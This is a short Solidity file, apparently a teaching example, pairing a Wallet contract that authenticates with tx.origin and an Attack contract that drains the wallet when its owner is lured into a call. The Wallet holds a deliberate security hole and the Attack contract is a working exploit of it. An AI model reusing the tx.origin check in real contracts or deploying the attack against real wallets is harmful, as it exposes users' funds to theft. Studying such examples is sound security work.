// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    /*tx.origin returns the address that initiated the call
    * rather than the call of this function
    * eg. A -> B and B -> C then tx.origin => address(A)
    * rather than address(B) who is the call
    * this results in a phishing attack.
    */
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
